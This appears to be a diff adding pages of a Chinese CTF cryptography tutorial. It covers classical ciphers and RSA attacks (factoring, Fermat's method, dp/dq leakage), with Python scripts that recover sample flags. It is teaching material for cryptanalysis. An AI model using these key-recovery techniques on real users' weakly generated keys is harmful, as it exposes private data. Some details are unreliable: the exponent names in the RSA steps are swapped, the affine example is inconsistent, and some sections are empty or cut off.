+<div style="break-before: page; page-break-before: always;"></div><h1 id="古典密码"><a class="header" href="#古典密码">古典密码</a></h1>
+<p>古典密码是指在现代计算机技术出现之前使用的加密方法，主要<strong>基于字符</strong>，分为两种类型：<code>代换密码</code>和<code>置换密码</code>。</p>
+<h2 id="代换替换密码substitution-cipher"><a class="header" href="#代换替换密码substitution-cipher">代换（替换）密码（Substitution Cipher）</a></h2>
+<p>代换密码是将明文中的字符替换成其他字符，即替代转换。若加密过程中，每个字符采用同一张表替代，则为<strong>单表代换密码</strong>；若整个加密过程中每个字符采用不同的表替代，则为<strong>多表代换密码</strong>。</p>
+<p>破解代换加密的基本方法是用统计手段，即统计语言中的一些字或字母出现频率的规律。</p>
+<h3 id="单表代换密码"><a class="header" href="#单表代换密码">单表代换密码</a></h3>
+<p>单表代换密码是在明文和密文之间建立一一映射关系，也就是说明文与密文一一对应。所以有以下两种方式来进行破解：</p>
+<ol>
+<li>在密钥空间较小的情况下，采用暴力破解方式</li>
+<li>在密文长度足够长的情况下，采用词频分析方式</li>
+</ol>
+<p>当密钥空间足够大，且密文长度足够短的情况下，破解较为困难。</p>
+<h4 id="单字母替换密码mono-alphabetic-substitution-cipher"><a class="header" href="#单字母替换密码mono-alphabetic-substitution-cipher">单字母替换密码（Mono-Alphabetic Substitution Cipher）</a></h4>
+<p>每个字母被固定的替换为另一个字母。</p>
+<pre><code class="language-python">key = {
+    "a": "f",
+    "b": "y",
+    "c": "a",
+    "d": "b",
+    "e": "z",
+    "f": "c",
+    "g": "m",
+    "h": "s",
+    "i": "n",
+    "j": "t",
+    "k": "o",
+    "l": "h",
+    "m": "q",
+    "n": "v",
+    "o": "r",
+    "p": "x",
+    "q": "w",
+    "r": "i",
+    "s": "k",
+    "t": "u",
+    "u": "l",
+    "v": "j",
+    "w": "p",
+    "x": "g",
+    "y": "d",
+    "z": "e"
+}
+
+secret = "The trouble with having an open mind, of course, is that people will insist on coming along and trying to put things in it.".lower()
+secret = filter(str.isalpha, secret)
+
+encrypted = "".join([key[i] for i in secret])
+print(encrypted)
+#uszuirlyhzpnussfjnvmfvrxzvqnvbrcarlikznkusfuxzrxhzpnhhnvknkurvarqnvmfhrvmfvbuidnvmurxluusnvmknvnu
+</code></pre>
+<p>由于密文中的字母频率没有变化，在较长的密文和英文文本的情况下，可以通过字母频率分析来破解密码。可以使用在线工具 <a href="https://quipqiup.com/">https://quipqiup.com/</a> 辅助解密。</p>
+<p><img src="crypto/../images/quipqiup.gif" alt="quipqiup" /></p>
+<ul>
+<li><a href="https://cryptii.com/pipes/alphabetical-substitution">https://cryptii.com/pipes/alphabetical-substitution</a></li>
+<li><a href="https://www.101computing.net/mono-alphabetic-substitution-cipher/">https://www.101computing.net/mono-alphabetic-substitution-cipher/</a></li>
+</ul>
+<h4 id="移位密码凯撒密码"><a class="header" href="#移位密码凯撒密码">移位密码（凯撒密码）</a></h4>
+<p>凯撒密码（Caesar Cipher）是移位密码（Shift Cipher）的一种，通过将明文中每个字母在字母表中向前或向后移动固定的长度来生成密文。例如，当偏移量为 3 时，字母<code>A</code>会被替换为<code>D</code>，字母<code>B</code>会变成<code>E</code>，以此类推。</p>
+<p><img src="crypto/../images/CaesarCipher-1.png" alt="CaesarCipher" /></p>
+<blockquote>
+<p>凯撒密码的密钥是 0 到 25 之间的整数，因此可以通过穷举法进行破解。</p>
+</blockquote>
+<h4 id="rot系列密码"><a class="header" href="#rot系列密码">ROT系列密码</a></h4>
+<ul>
+<li><a href="https://rot13.com/">ROT13</a>，实际上是凯撒密码的一种，默认位移量为 13，仅适用于字母，连续两次加密可恢复明文。</li>
+<li><a href="https://rot47.net/">ROT47</a>，处理 ASCII 码在 33 到 126 之间的字符，默认旋转位移为 47 。</li>
+<li><a href="https://rot8000.com/">ROT8000</a>，通过将每个 Unicode 字符向前或向后移动<code>0x8000</code>个位置。</li>
+</ul>
+<h4 id="埃特巴什码atbash-cipher"><a class="header" href="#埃特巴什码atbash-cipher">埃特巴什码（Atbash Cipher）</a></h4>
+<p>埃特巴什码（Atbash Cipher）是一种单字母替换密码，采用字母表中的最后一个字母代表示第一个字母，倒数第二个字母表示第二个字母，以此类推。</p>
+<pre><code>明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ
+密文：ZYXWVUTSRQPONMLKJIHGFEDCBA
+</code></pre>
+<p>例如，明文<code>MIRROR</code>加密为<code>NRIILI</code>。埃特巴什码也被称为<code>镜像密码</code>。</p>
+<!-- #### rabbit -->
+<h4 id="仿射密码affine-cipher"><a class="header" href="#仿射密码affine-cipher">仿射密码（Affine Cipher）</a></h4>
+<p>仿射加密（Affine cipher）是一种基于线性变换的加密方法。</p>
+<p>加密过程：
+$$
+E(x)=(ax+b) \mod m
+$$</p>
+<p>解密解密：
+$$
+D(x)=a^{-1}(x-b) \mod m
+$$</p>
+<p><code>x</code>为字符在字母表中的位置，从<code>0</code>开始。<code>m</code>为字母表的长度，例如对于英文字母为 26。</p>
+<p>假设我们要加密字符串 "HELLO"，使用以下参数：</p>
+<ul>
+<li>a=5</li>
+<li>b=8</li>
+<li>字母表长度 m=26</li>
+</ul>
+<p><code>H → 7</code></p>
+<p><code>E(7)=(5⋅7+8) mod 26 = (35+8) mod 26 = 17</code>,17 对应的字母为 R。
+因此，字符串 "HELLO" 的加密结果是 "RCLLA"。</p>
+<h4 id="培根密码bacon-cipher"><a class="header" href="#培根密码bacon-cipher">培根密码（Bacon Cipher）</a></h4>
+<p>培根密码（Bacon Cipher），又叫倍康尼密码，是由法兰西斯·培根发明的一种替换密码。加密时，明文中的每个字母都会替换成一组五个英文字母。其转换依靠下表：</p>
+<p><img src="crypto/../images/BaconCipher-2.png" alt="BaconCipher" /></p>
+<p>转换表有两个版本。一是<code>i</code> 和<code>j</code>、<code>u</code>和<code>v</code>使用相同的编码。二是所有字母使用不同的编码。
+例如，对明文<code>hello world</code>进行加密。步骤如下：
+第一步，将<code>H</code>替换为<code>aabbb</code>，<code>E</code>替换为<code>aabaa</code>等等</p>
+<p><img src="crypto/../images/BaconCipher-helloworld-1.png" alt="BaconCipher-helloworld-1" /></p>
+<p>第二步，隐藏信息。常规字体表示<code>a</code>，粗体表示<code>b</code></p>
+<p><img src="crypto/../images/BaconCipher-helloworld-2.png" alt="BaconCipher-helloworld-2" /></p>
+<p>也可以使用大小写来隐藏信息。</p>
+<pre><code>sSsSSsSSssSSsSsSsSssSSSSSSSssS{SSSsSsSSSsSsSSSsSSsSSssssssSSSSSSSsSSSSSSSSsSSsssSSssSsSSSsSSsSSSSssssSSsssSSsSSsSSSs}
+</code></pre>
+<pre><code>UTFLAG{CRISPYBACONCIPHER}
+</code></pre>
+<p>培根密码本质上是将二进制信息通过样式的区别，加在了正常书写之上，样式包括大小写、斜体和加粗等。培根密码所包含的信息可以和用于承载其的文章完全无关。</p>
+<!-- #### 希尔密码（Hill Cipher）希尔密码（Hill Cipher） -->
+<h3 id="多表代换密码"><a class="header" href="#多表代换密码">多表代换密码</a></h3>
+<p>在多表代换中，由于使用不同的字母表或关键词，相同的明文字母在不同的位置可能会对应不同的密文字母，实现<code>动态替换</code>。同时，明文字符的频率被改变，从而抵抗词频分析攻击。</p>
+<!-- #### 棋盘密码 -->
+<h4 id="维吉尼亚密码vigenère-cipher"><a class="header" href="#维吉尼亚密码vigenère-cipher">维吉尼亚密码（Vigenère Cipher）</a></h4>
+<p>维吉尼亚密码是一种基于凯撒密码的加密算法，属于多表代换的简单形式。</p>
+<p>加密时，密钥长度必须与明文长度相等，如果关键词长度不足，需要将其扩展至明文长度。该算法有重复（<code>Repeat</code>）和自钥（<code>Autokey</code>）两种模式，默认使用<code>重复模式</code>，即固定关键词重复扩展，如关键词为<code>key</code>时重复扩展为<code>keykey....</code>。自钥模式则是将关键词与明文组合形成密钥，如<code>key明文</code>。</p>
+<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Vigen%C3%A8re_square_shading.svg/900px-Vigen%C3%A8re_square_shading.svg.png" alt="维吉尼亚密码字母表" /></p>
+<p>例如，明文<code>HELLOWORLD</code>，关键词<code>SECRET</code>，对于明文第 1 个字母 <code>H</code>，对应密钥的第 1 个字母 <code>S</code>，于是使用第 S 行字母进行加密，得到密文第一个字母 <code>Z</code>，以此类推，密文为<code>ZINCSPGVNU</code>。</p>
+<ul>
+<li><a href="https://cryptii.com/pipes/vigenere-cipher">https://cryptii.com/pipes/vigenere-cipher</a></li>
+</ul>
+<h4 id="普莱费尔密码playfair-cipher"><a class="header" href="#普莱费尔密码playfair-cipher">普莱费尔密码（Playfair Cipher）</a></h4>
+<p>普莱费尔密码（Playfair Cipher）是第一个二字母替换密码，1854 年由英国人查尔斯 · 惠斯通（Charles Wheatstone）发明，基本算法如下：</p>
+<p>例如，选取密钥为<code>playfair</code>，去除重复字母后，得到<code>playfir</code>，将字母按顺序填入$5 \times 5$的矩阵中，余下的位置用字母表中剩下的字母填充，其中<code>i</code>和<code>j</code>作为同一个字母。</p>
+<blockquote>
+<p>注意，由于矩阵大小只有25个，而字母有26个，可以将<code>i</code>和<code>j</code>视作同一字母，或者将<code>q</code>去除。</p>
+</blockquote>
+<p>$$
+\begin{array}{ccccc}
+P &amp; L &amp; A &amp; Y &amp; F \
+I &amp; R &amp; B &amp; C &amp; D \
+E &amp; G &amp; H &amp; K &amp; M \
+N &amp; O &amp; Q &amp; S &amp; T \
+U &amp; V &amp; W &amp; X &amp; Z \
+\end{array}
+$$</p>
+<p>加密过程如下：</p>
+<ul>
+<li>将明文去掉空格后，每两个字母一组，如果一组中的字母相同，则在中间插入一个填充字母（通常为<code>X</code>），然后重新分组。必要的话，在最后一组末尾加字母<code>X</code>。例如明文为<code>HELLO</code>，分组结果为<code>HE LX LO</code>。</li>
+<li>对每一组字母，按照以下规则进行加密
+<ul>
+<li>如果两个字母在同一行，则用它们右边的字母替换（如果在最右边，则循环到最左边）。例如<code>HE</code>-&gt;<code>KG</code>。</li>
+<li>如果两个字母在同一列，则用它们下边的字母替换（如果在最下边，则循环到最上边）。例如<code>LO</code>-&gt;<code>RV</code>。</li>
+<li>如果两个字母不在同一行也不在同一列，则用它们所在矩阵的对角线上字母替换。例如<code>LX</code>-&gt;<code>YV</code>。</li>
+</ul>
+</li>
+</ul>
+<p>完整的密文是<code>KGYVRV</code>。解密时，将这一过程倒过来。</p>
+<!-- 例题： [picoCTF 2021 Play nice](https://ctftime.org/task/15292)
+https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Play_Nice.md -->
+<h3 id="图形代换密码"><a class="header" href="#图形代换密码">图形代换密码</a></h3>
+<h4 id="猪圈密码pigpen-cipher"><a class="header" href="#猪圈密码pigpen-cipher"><a href="https://www.dcode.fr/pigpen-cipher">猪圈密码</a>（Pigpen Cipher）</a></h4>
+<p>猪圈密码是一种以格子为基础的图形代换密码，最初由希伯来拉比和圣殿骑士使用。它通过将字母放置在“#”和“X”图形中，通过附近的线条和点表示编码字母，主要有两个版本：原始版本和修改版本。</p>
+<p><img src="crypto/../images/PigpenCipher-1.png" alt="猪圈密码" /></p>
+<p>例如，明文<code>X marks the spot</code>的密文如下：</p>
+<p><img src="crypto/../images/PigpenCipher-2.jpg" alt="猪圈密码示例" /></p>
+<p>在线加解密网站：</p>
+<ul>
+<li><a href="https://rumkin.com/tools/cipher/pigpen/">https://rumkin.com/tools/cipher/pigpen/</a></li>
+<li><a href="https://www.dcode.fr/pigpen-cipher">https://www.dcode.fr/pigpen-cipher</a></li>
+</ul>
+<!-- #### 键盘密码 -->
+<h4 id="跳舞小人密码dancing-men-cipher"><a class="header" href="#跳舞小人密码dancing-men-cipher">跳舞小人密码（Dancing Men Cipher）</a></h4>
+<p><img src="https://p9-tt-ipv6.byteimg.com/large/pgc-image/85c18be4a7824119a16b443f047341c6" alt="跳舞小人" /></p>
+<h4 id="键盘密码"><a class="header" href="#键盘密码">键盘密码</a></h4>
+<p>所谓键盘密码，就是采用手机键盘或者电脑键盘进行加密。</p>
+<ul>
+<li>手机键盘密码</li>
+</ul>
+<p>手机键盘加密方式，是每个数字键上有 3-4 个字母，用两位数字来表示字母，例如：ru 用手机键盘表示就是：7382，那么这里就可以知道了，手机键盘加密方式不可能用 1 开头，第二位数字不可能超过 4，解密的时候参考此。</p>
+<p><img src="https://ctf-wiki.org/crypto/classical/figure/mobile.jpg" alt="" /></p>
+<p>关于手机键盘加密还有另一种方式，就是「音的」式（这一点可能根据手机的不同会有所不同），具体参照手机键盘来打，例如：「数字」表示出来就是：748 94。在手机键盘上面按下这几个数，就会出：「数字」的拼音。</p>
+<ul>
+<li>电脑键盘棋盘</li>
+</ul>
+<p>电脑键盘棋盘加密，利用了电脑的棋盘方阵。</p>
+<p><img src="https://ctf-wiki.org/crypto/classical/figure/computer-chess.jpg" alt="" /></p>
+<ul>
+<li>电脑键盘坐标</li>
+</ul>
+<p>电脑键盘坐标加密，利用键盘上面的字母行和数字行来加密，例：bye 用电脑键盘 XY 表示就是：351613</p>
+<p><img src="https://ctf-wiki.org/crypto/classical/figure/computer-x-y.jpg" alt="" /></p>
+<ul>
+<li>电脑键盘 QWE
+电脑键盘 QWE 加密法，就是用字母表替换键盘上面的排列顺序。</li>
+</ul>
+<p><img src="https://ctf-wiki.org/crypto/classical/figure/computer-qwe.jpg" alt="" /></p>
+<p>例题分析：[SWPUCTF 2021 新生赛]我的银行卡密码</p>
+<!-- https://blog.csdn.net/2301_76328911/article/details/136545008 -->
+<h2 id="置换密码"><a class="header" href="#置换密码">置换密码</a></h2>
+<p>置换密码（Transposition Cipher）又称为转置密码或换位密码，是指通过改变明文中各字符位置得到密文，其字符不变，但位置改变，即<strong>位置转换</strong>。典型的有栅栏密码、曲路密码等。</p>
+<h3 id="栅栏密码"><a class="header" href="#栅栏密码">栅栏密码</a></h3>
+<p>栅栏密码（Rail Fence Cipher）通过将文本以波浪形排列实现。根据排列形状，分为 W 型（传统型）和 N 型。以下是对明文<code>helloworld</code>按照 3 栏加密的传统型示例。</p>
+<ul>
+<li>默认偏移<code>offset</code>为 0，密文为<code>holelwrdlo</code>。</li>
+</ul>
+<pre><code>h...o...l.
+.e.l.w.r.d
+..l...o...
+</code></pre>
+<ul>
+<li>若偏移<code>offset</code>为 1，密文为<code>lrhloolewd</code></li>
+</ul>
+<pre><code>...l...r..
+h.l.o.o.l.
+.e...w...d
+</code></pre>
+<p>例题分析：</p>
+<p><code>Ta _7N6DDDhlg:W3D_H3C31N__0D3ef sHR053F38N43D0F i33___NA</code>
+，原文中存在
+在线加解密网站：</p>
+<ul>
+<li><a href="https://www.geocachingtoolbox.com/index.php?page=railFenceCipher">https://www.geocachingtoolbox.com/index.php?page=railFenceCipher</a></li>
+<li><a href="https://rumkin.com/tools/cipher/rail-fence/">https://rumkin.com/tools/cipher/rail-fence/</a></li>
+</ul>
+<!-- ### 曲路密码 -->
+<h2 id="总结"><a class="header" href="#总结">总结</a></h2>
+<ul>
+<li>如果给定的密文长度较长，考虑字母频率分析</li>
+</ul>
+<h2 id="参考资料-2"><a class="header" href="#参考资料-2">参考资料</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rsa"><a class="header" href="#rsa">RSA</a></h1>
+<p>RSA 加密算法是一种<strong>非对称加密算法</strong>，广泛应用于公开密钥加密和电子商务中。该算法于 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）提出，RSA 的名称来源于他们三位创始人的姓氏首字母。</p>
+<p>RSA 算法的安全性基于大整数分解的难度。换句话说，分解一个非常大的整数越困难，RSA 算法就越安全。如果有人找到快速分解整数的算法，那么使用 RSA 加密的信息的安全性将会大幅下降。然而，找到这样的算法的可能性非常小。目前，只有短的 RSA 密钥可能会受到强力破解的威胁。</p>
+<h2 id="数论基础"><a class="header" href="#数论基础">数论基础</a></h2>
+<h3 id="整除"><a class="header" href="#整除">整除</a></h3>
+<p>设 a，b 是两个整数，且 \(b \neq 0 \) ，如果存在整数 c 使 \( a = bc \)，则称 a 被 b 整除，或 b 整除 a。</p>
+<h3 id="素数"><a class="header" href="#素数">素数</a></h3>
+<p>在大于 1 的自然数中，除了 1 和它本身外，不能被其他自然数整除的数称为素数（Prime Number），否则称为合数。素数也被称作质数。换句话说，素数只有两个正因数：1 和它本身。</p>
+<p>例如，7 和 11 是素数。最小的素数是 2。</p>
+<h3 id="互素"><a class="header" href="#互素">互素</a></h3>
+<p>互素指的是两个整数之间的最大公因数为 1。换句话说，两个数互素意味着它们没有其他公因数，除了 1。</p>
+<p>例如，数字 8 和 15 是互素的，因为它们的最大公约数是 1。数字 12 和 18 不是互素的，因为它们的最大公约数是 6。</p>
+<h3 id="欧拉函数"><a class="header" href="#欧拉函数">欧拉函数</a></h3>
+<p>欧拉函数通常用 \( \varphi(n) \) 表示。</p>
+<p>$$ \varphi(n) = \text{小于等于 n 的正整数中，与 n 互素的个数} $$</p>
+<p>如\( \varphi(1) = \varphi(2) = 1 \)，\( \varphi(3) = \varphi(4)=2 \)。显然，当 n 为素数时， \( \varphi(n) = n-1 \)；当 n 为合数时， \( \varphi(n) &lt; n-1 \)。</p>
+<h3 id="同余式"><a class="header" href="#同余式">同余式</a></h3>
+<h3 id="中国剩余定理"><a class="header" href="#中国剩余定理">中国剩余定理</a></h3>
+<h2 id="rsa-算法简述"><a class="header" href="#rsa-算法简述">RSA 算法简述</a></h2>
+<ol>
+<li>随机选择两个不同的大素数 \( p \) 和 \( q \)，计算 \( N = p \times q \)</li>
+<li>根据欧拉函数，求\( \varphi(N) = \varphi(p)\varphi(q) = (p-1)(q-1) \)</li>
+<li>随机选择一整数\( e \)（解密指数），满足\( 0 &lt; e &lt; \varphi(N) \)，且\( e \)和\( \varphi(N) \)互素</li>
+<li>计算加密指数\( d \)，满足\( ed \equiv 1\ ( \bmod \varphi(N)) \)，\( d \)为\( e \)关于\( \varphi(N) \)的模反元素</li>
+<li>销毁\( p \)、\( q \)</li>
+</ol>
+<p>其中\( (N,e) \)为公钥，\( (N,d) \)为私钥。假定\( c \)为密文，\( m \)为明文，则</p>
+<p>加密过程为\( c = m^e \bmod N \)</p>
+<p>解密过程为\( m = c^d \bmod N \)</p>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+
+p = 885320963
+q = 238855417
+n = p*q
+phin = (p-1)*(q-1)
+print('phin:', phin) # 211463706672030192
+e = 65537
+d = gmpy2.invert(e, phin)
+print('d:', d) # 34737907838794529
+
+# 加密
+m = b'abc'
+print("m_to_long:", bytes_to_long(m)) # 6382179
+c = gmpy2.powmod(bytes_to_long(m), e, n)
+print('encrypt:', c) # 151999436028678347
+
+# 解密
+m1 = gmpy2.powmod(c, d, n)
+print('plain_long:',m1) # 6382179
+print('plain_text:',long_to_bytes(m1)) # b'abc'
+</code></pre>
+<h2 id="环境准备"><a class="header" href="#环境准备">环境准备</a></h2>
+<ul>
+<li>Python 3 依赖安装
+<ul>
+<li><code>gmpy2</code>是一个用于高精度算术运算的 Python 库，要求 Python 3.7 to 3.13。</li>
+<li><code>pycryptodome</code>是PyCrypto的替代品，提供更强大的加密算法支持。</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">pip install gmpy2 pycryptodome -i https://mirrors.aliyun.com/pypi/simple 
+</code></pre>
+<ul>
+<li><a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></li>
+</ul>
+<h2 id="常见攻击方法"><a class="header" href="#常见攻击方法">常见攻击方法</a></h2>
+<h3 id="模数分解因数分解"><a class="header" href="#模数分解因数分解">模数分解（因数分解）</a></h3>
+<p>模数分解（因数分解）是指将 RSA 公钥中的模数 \( n \) 分解为两个素数 \( p、q \) 的乘积。</p>
+<h4 id="直接分解"><a class="header" href="#直接分解">直接分解</a></h4>
+<p>在实际应用中，RSA 算法使用的素数长度在 1024 位、2048 位或更高。在 CTF 赛题中，若模数 \( n \) 的位数比较小，则可以直接因式分解模数\( n \)，进而获得\( p、q \)。</p>
+<p>因式分解的工具有<a href="https://github.com/bbuhrow/yafu">Yafu</a>、<a href="https://factordb.com/">factordb.com</a>是一个专门用于存储和查询整数的因数分解结果的在线数据库，以及其他的因式分解算法。</p>
+<p>例如，在 DeconstruCT.F 2021 的 RSA-1 题目中，发现模数\( n \)比较小，考虑分解模数\( n \)。</p>
+<pre><code class="language-text">Ever used RSA Encryption?
+
+cyphertext = 10400286653072418349777706076384847966640064725838262071
+n = 23519325203263800569051788832344215043304346715918641803
+e = 71
+</code></pre>
+<p>方法一：<a href="https://factordb.com/">factordb.com</a>是一个专门用于存储和查询整数的因数分解结果的在线数据库。</p>
+<p>方法二：本地工具<a href="https://github.com/bbuhrow/yafu">Yafu</a></p>
+<p>获取\( p、q \)后，可以直接编写代码进行解密。参考 Python 3 代码如下：</p>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+c = 10400286653072418349777706076384847966640064725838262071
+p = 4655885807254867892895911581
+q = 5051525354555657585960616263
+n = 23519325203263800569051788832344215043304346715918641803
+e = 71
+
+phin = (p-1)*(q-1)
+d = gmpy2.invert(e, phin)
+m = gmpy2.powmod(c, d, n)
+
+print(long_to_bytes(m)) # b'dsc{t00_much_m4th_8898}'
+</code></pre>
+<p>方法三：使用<a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a></p>
+<pre><code class="language-bash">./RsaCtfTool.py -n 23519325203263800569051788832344215043304346715918641803 -e 71 --decrypt 10400286653072418349777706076384847966640064725838262071
+</code></pre>
+<h4 id="利用公因数"><a class="header" href="#利用公因数">利用公因数</a></h4>
+<p>如果在两次公钥的加密过程中使用的\( n_1 \) 和\( n_2 \)具有相同的素因子，那么可以利用欧几里得算法直接将\( n_1 \)和\( n_2 \)分解。</p>
+<p>通过欧几里得算法可以直接求出\( n_1 \)和\( n_2 \)的最大公因数\( p \)：</p>
+<ul>
+<li>识别：题目往往给了若干不相同的模数\( n \)，且使用相同的加密指数\( e \)，那么可以考虑模数是否有公约数，进而进行模数分解</li>
+</ul>
+<pre><code class="language-python">p1 = getPrime(512)
+p2 = getPrime(512)
+q = getPrime(512)
+n1 = p1*q
+n2 = p2*q
+</code></pre>
+<pre><code class="language-python">
+</code></pre>
+<h4 id="left-p-q-right较小"><a class="header" href="#left-p-q-right较小">$\left| p-q \right|$较小</a></h4>
+<p>\( \left| p-q \right| \) 很小，即\( p、q \) 相差过小，可以使用费马分解法 (Fermat's factorization method)来快速分解模数\( n \)。</p>
+<p>0x41414141 CTF factorize，题目提供了密文\( c \)、模数$n$以及<code>factorize.py</code>文件。</p>
+<pre><code class="language-text">c: 17830167351685057470426148820703481112309475954806278304600862043185650439097181747043204885329525211579732614665322698426329449125482709124139851522121862053345527979419420678255168453521857375994190985370640433256068675028575470040533677286141917358212661540266638008376296359267047685745805295747215450691069703625474047825597597912415099008745060616375313170031232301933185011013735135370715444443319033139774851324477224585336813629117088332254309481591751292335835747491446904471032096338134760865724230819823010046719914443703839473237372520085899409816981311851296947867647723573368447922606495085341947385255
+n: 23135514747783882716888676812295359006102435689848260501709475114767217528965364658403027664227615593085036290166289063788272776788638764660757735264077730982726873368488789034079040049824603517615442321955626164064763328102556475952363475005967968681746619179641519183612638784244197749344305359692751832455587854243160406582696594311842565272623730709252650625846680194953309748453515876633303858147298846454105907265186127420148343526253775550105897136275826705375222242565865228645214598819541187583028360400160631947584202826991980657718853446368090891391744347723951620641492388205471242788631833531394634945663
+</code></pre>
+<p><code>factorize.py</code>：</p>
+<pre><code class="language-python">import binascii
+import random
+from Crypto.Util.number import isPrime
+
+flag = open("flag.txt", "rb").read().strip()
+m = int(binascii.hexlify(flag), 16)
+
+def genPrimes(size):
+    base = random.getrandbits(size // 2) &lt;&lt; size // 2 # 生成一个512位的随机整数，并将这个整数左移512位
+    base = base | (1 &lt;&lt; 1023) | (1 &lt;&lt; 1022) | 1
+    while True:
+        temp = base | random.getrandbits(size // 2)
+        if isPrime(temp):
+            p = temp
+            break
+    while True:
+        temp = base | random.getrandbits(size // 2)
+        if isPrime(temp):
+            q = temp
+            break
+    return (p, q)
+
+p, q = genPrimes(1024)
+n = p * q
+e = 0x10001
+
+print("c:", pow(m, e, n))
+</code></pre>
+<pre><code class="language-python">from Crypto.Util.number import isPrime, getStrongPrime
+from gmpy import next_prime
+from secret import flag
+
+# Anti-Fermat Key Generation
+p = getStrongPrime(1024)
+q = next_prime(p ^ ((1&lt;&lt;1024)-1))
+n = p * q
+e = 65537
+
+# Encryption
+m = int.from_bytes(flag, 'big')
+assert m &lt; n
+c = pow(m, e, n)
+
+print('n = {}'.format(hex(n)))
+print('c = {}'.format(hex(c)))
+</code></pre>
+<pre><code class="language-python">from math import isqrt
+from Crypto.Util.number import inverse, long_to_bytes
+
+n = 0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751
+c = 0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62
+e = 65537
+
+def FermatFactors(n):
+    a = (((1 &lt;&lt; 1024)-1) + 1)//2
+
+    while True:
+        b1 = a * a - n
+        b = isqrt(b1)
+        if b * b == b1:
+            break
+        a += 1
+    return a - b, a + b
+
+p, q = FermatFactors(n)
+assert p*q == n
+phi = (p-1)*(q-1)
+d = inverse(e, phi)
+print(long_to_bytes(pow(c, d, n)).decode())
+</code></pre>
+<h3 id="dp-泄露"><a class="header" href="#dp-泄露">dp 泄露</a></h3>
+<ul>
+<li>识别：已知$n、e、dp、c$</li>
+</ul>
+<p>$$
+dp = d(\bmod p-1)
+$$</p>
+<pre><code class="language-python">from Crypto.Util.number import long_to_bytes
+import gmpy2
+
+# 已知参数
+e = 65537
+n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113
+dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657
+
+c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751
+
+
+# 计算 p
+for k in range(1, e):
+    p = ((dp * e - 1) // k) + 1
+    if n % p == 0:
+        break
+
+# 计算 q
+q = n // p
+
+# 计算 d
+phi_n = (p - 1) * (q - 1)
+d = gmpy2.invert(e, phi_n)
+
+# 解密密文
+m = gmpy2.powmod(c, d, n)
+
+# 打印解密后的明文
+print(long_to_bytes(m))  # b'flag{wow_leaking_dp_breaks_rsa?_98924743502}'
+</code></pre>
+<!--
+https://www.cnblogs.com/vconlln/p/17066500.html
+-->
+<h3 id="dqdp-泄露"><a class="header" href="#dqdp-泄露">dq、dp 泄露</a></h3>
+<ul>
+<li>识别：已知$p、q、dp、dq、c$</li>
+</ul>
+<p>$$
+\begin{align}
+dq=d(\bmod q-1) \
+dp=d(\bmod p-1) \
+InvQ=q^{−1} (\bmod p)
+\end{align}
+$$</p>
+<p>例题 PicoCTF 2017 Weird RSA</p>
+<pre><code class="language-text">c: 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885
+p: 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243
+q: 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629
+dp: 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961
+dq: 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659
+</code></pre>
+<pre><code class="language-python">import gmpy2
+from Crypto.Util.number import long_to_bytes
+
+c = 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885
+p = 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243
+q = 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629
+dp = 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961
